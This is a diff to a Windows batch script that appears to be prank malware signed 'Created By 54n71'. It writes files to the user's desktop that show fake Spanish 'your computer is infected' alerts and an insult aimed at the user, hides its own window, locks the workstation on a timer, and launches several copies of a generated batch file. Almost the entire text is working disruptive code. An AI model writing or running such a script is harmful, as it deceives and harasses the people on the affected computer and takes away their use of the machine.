@@ -1,5 +1,7 @@
 @echo off
+powershell -window minimized -command "" 
 mode 30 , 01
+pause
 cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
@@ -307,6 +309,15 @@ echo X=MsgBox("Su equipo esta infectado",0+48,"Windows") >> notvi.vbs
 echo X=MsgBox("Le recomendamos que..",0+48,"Windows") >> notvi.vbs
 echo X=MsgBox("No confies en nadie",0+48,"%username% ") >> notvi.vbs
 echo X=MsgBox("Jajajaja %username% , alto nombre de virgen ",0+48,"Created By 54n71") >> notvi.vbs
+echo @echo off >> notvi.bat
+echo powershell -window minimized -command "" >> notvi.bat
+echo goto 1 >> notvi.bat
+echo :1 >> notvi.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> notvi.bat
+echo timeout 15 > NUL >> notvi.bat
+echo RunDll32.exe user32.dll,LockWorkStation >> notvi.bat
+echo exit >> notvi.bat
+
 cd C:\Users\%username%\Desktop
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
